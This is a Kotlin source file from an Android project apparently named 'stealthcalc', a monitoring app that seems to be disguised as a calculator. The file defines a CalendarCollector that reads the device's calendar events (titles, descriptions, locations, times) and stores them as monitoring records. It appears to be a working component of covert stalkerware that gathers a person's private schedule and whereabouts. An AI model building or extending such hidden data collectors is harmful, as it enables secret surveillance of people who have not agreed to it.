package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CalendarContract
import androidx.core.content.ContextCompat
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.CalendarEventPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CalendarCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private var lastEventId: Long = 0L

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) ==
                PackageManager.PERMISSION_GRANTED

    suspend fun collect() {
        if (!repository.isMetricEnabled("calendar")) return
        if (!hasPermission()) return

        val now = System.currentTimeMillis()
        val weekAhead = now + 7 * 24 * 3600 * 1000L

        val cursor = context.contentResolver.query(
            CalendarContract.Events.CONTENT_URI,
            arrayOf(
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.DESCRIPTION,
                CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND,
                CalendarContract.Events.CALENDAR_DISPLAY_NAME,
                CalendarContract.Events.ALL_DAY,
            ),
            "${CalendarContract.Events._ID} > ? AND ${CalendarContract.Events.DTSTART} < ?",
            arrayOf(lastEventId.toString(), weekAhead.toString()),
            "${CalendarContract.Events._ID} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(0)
                val title = it.getString(1) ?: "No title"
                val description = it.getString(2)
                val location = it.getString(3)
                val start = it.getLong(4)
                val end = it.getLong(5)
                val calName = it.getString(6)
                val allDay = it.getInt(7) == 1

                val payload = Json.encodeToString(
                    CalendarEventPayload(
                        title = title,
                        description = description,
                        location = location,
                        startTime = start,
                        endTime = end,
                        calendarName = calName,
                        allDay = allDay,
                    )
                )
                repository.recordEvent(MonitoringEventKind.CALENDAR_EVENT, payload)
                if (id > lastEventId) lastEventId = id
            }
        }
    }
}
